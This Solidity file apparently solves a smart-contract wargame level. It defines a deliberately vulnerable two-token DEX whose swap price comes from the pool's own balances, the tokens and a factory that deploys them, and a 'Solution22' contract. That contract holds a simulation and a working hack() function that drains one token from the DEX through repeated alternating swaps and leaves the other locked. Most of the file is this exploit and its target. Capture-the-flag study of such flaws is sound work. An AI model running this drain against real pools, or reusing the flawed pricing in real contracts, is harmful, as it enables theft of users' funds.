// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
    using SafeMath for uint256;
    address public token1;
    address public token2;

    constructor() public {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount)
        public
        onlyOwner
    {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(
        address from,
        address to,
        uint256 amount
    ) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account)
        public
        view
        returns (uint256)
    {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public returns (bool) {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract DexFactory {
    address[] public dexList;

    function create() public returns(address) {
        Dex dex = new Dex();
        dexList.push(address(dex));

        SwappableToken token1 = new SwappableToken(address(dex), "Test Token 1", "TT1", 110);
        SwappableToken token2 = new SwappableToken(address(dex), "Test Token 2", "TT2", 110);

        // Set tokens and add liquidity
        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        // Transfer 10 tokens to user
        token1.transfer(msg.sender, 10);
        token2.transfer(msg.sender, 10);

        return address(dex);
    }
}

contract Solution22 {
    uint256 public token1Bal = 100;
    uint256 public token2Bal = 100;
    uint256 public token1UserBal = 10;
    uint256 public token2UserBal = 10;

    // swap token1 for token2
    function swap1(uint256 fromAmount) public returns (uint256) {
        uint256 toAmount = calcToAmount(fromAmount, token1Bal, token2Bal);
        token1Bal += fromAmount;
        token2Bal -= toAmount;
        token1UserBal -= fromAmount;
        token2UserBal += toAmount;
        return toAmount;
    }

    // swap token2 for token1
    function swap2(uint256 fromAmount) public returns (uint256) {
        uint256 toAmount = calcToAmount(fromAmount, token2Bal, token1Bal);
        token2Bal += fromAmount;
        token1Bal -= toAmount;
        token2UserBal -= fromAmount;
        token1UserBal += toAmount;
        return toAmount;
    }

    // This is simulation for the hack.
    // After hacking token1 was stolen, and token2 is locked forever.
    function hackMock() public {
        while (token1Bal != 0 && token2Bal != 0) {
            if (token1UserBal == 0) {
                // swap token2 for token1
                swap2(calcMaxFromAmount(token2UserBal, token2Bal, token1Bal));
            } else {
                // swap token1 for token2
                swap1(calcMaxFromAmount(token1UserBal, token1Bal, token2Bal));
            }
        }
    }

    // Approve this contract fist.
    // After hacking token1 was stolen, and token2 is locked forever.
    function hack(Dex _dex) public {
        _dex.approve(address(_dex), type(uint256).max);
        SwappableToken token1 = SwappableToken(_dex.token1());
        SwappableToken token2 = SwappableToken(_dex.token2());

        // Transfer user's balance to this
        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));
        token2.transferFrom(msg.sender, address(this), token2.balanceOf(msg.sender));

        uint token1DexBal = token1.balanceOf(address(_dex));
        uint token2DexBal = token2.balanceOf(address(_dex));

        while (token1DexBal != 0 && token2DexBal != 0) {
            if (token1.balanceOf(address(this)) == 0) {
                // swap token2 for token1
                _dex.swap(address(token2), address(token1), calcMaxFromAmount(token2.balanceOf(address(this)), token2DexBal, token1DexBal));
            } else {
                // swap token1 for token2
                _dex.swap(address(token1), address(token2), calcMaxFromAmount(token1.balanceOf(address(this)), token1DexBal, token2DexBal));
            }

            token1DexBal = token1.balanceOf(address(_dex));
            token2DexBal = token2.balanceOf(address(_dex));
        }
    }

    function calcMaxFromAmount(
        uint256 fromAmount,
        uint256 fromBal,
        uint256 toBal
    ) public pure returns (uint256) {
        uint256 toAmount = calcToAmount(fromAmount, fromBal, toBal);
        if (toAmount > toBal) {
            return calcFromAmount(toBal, fromBal, toBal);
        }

        return fromAmount;
    }

    // fromAmount / toAmount =  fromBal / toBal
    function calcToAmount(
        uint256 fromAmount,
        uint256 fromBal,
        uint256 toBal
    ) public pure returns (uint256) {
        return (fromAmount * toBal) / fromBal;
    }

    function calcFromAmount(
        uint256 toAmount,
        uint256 fromBal,
        uint256 toBal
    ) public pure returns (uint256) {
        return (fromBal * toAmount) / toBal;
    }
}
